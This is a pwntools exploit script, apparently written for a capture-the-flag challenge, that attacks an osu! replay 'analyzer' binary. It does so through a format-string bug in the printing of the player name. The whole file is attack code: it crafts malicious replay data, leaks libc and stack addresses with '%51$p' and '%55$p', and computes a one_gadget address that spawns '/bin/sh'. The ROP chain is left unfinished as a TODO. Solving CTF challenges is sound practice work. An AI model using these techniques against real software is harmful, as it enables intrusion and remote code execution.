#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./analyzer"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("chal.osugaming.lol", 7273)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+632
		b *main+898
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def conv(x):
    if type(x) is bytes:
        return x
    else:
        return x.encode()

def sl(x):
    p.sendline(conv(x))

def sla(delim, data):
    p.sendlineafter(conv(delim), conv(data))

# Vuln: printf function for displaying player name has FSB
def create_replay_data(player_name: str):
    data = b""
    data += b"00" # game mode type (standard)
    data += b"0134d7b3" # created date (20230307)
    data += b"00" # osu!beatmap MD5 hash (idk what it's means...)
    data += b"0b" # prefix for string type
    # string length
    name_len_int = len(player_name)
    name_len = str(hex(name_len_int)[2:]).encode()
    if name_len_int < 0x10 != 0:
        name_len = b'0' + name_len
    data += name_len
    # name
    hex_string = ''.join([format(ord(char), '02x') for char in player_name])
    data += hex_string.encode()
    data += b"00" # Replay MD5
    data += b"00" * 2 # 300s
    data += b"00" * 2 # 100s
    data += b"00" * 2 # 50s
    data += b"00" * 2 # Gekis
    data += b"00" * 2 # Katus
    data += b"00" * 2 # Miss

    return data

# libc leak
payload = create_replay_data("%51$p")
sla(':', payload)
p.recvuntil(b"name: ")
leak = eval(p.recvline().rstrip())
log.info("leak:" + hex(leak))
libc_base = leak - libc.symbols["__libc_start_call_main"] - 0x80
libc.address = libc_base
log.info("libc base:" + hex(libc_base))
rop_pop_rsi_ret = libc_base + 0x001bb197
log.info("pop rsi; ret :" + hex(rop_pop_rsi_ret))
one_gadget = libc_base + 0xebc88
"""
0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
"""
log.info("OneGadget:" + hex(one_gadget))

# stack leak
payload = create_replay_data("%55$p")
sla(':', payload)
p.recvuntil(b"name: ")
leak = eval(p.recvline().rstrip())
log.info("leak:" + hex(leak))
ret_addr = leak - 0x110
log.info("ret_addr@stack:" + hex(ret_addr))

# make ROP chain
# TODO

# exit
sla(':', "kanimiso")


p.interactive()
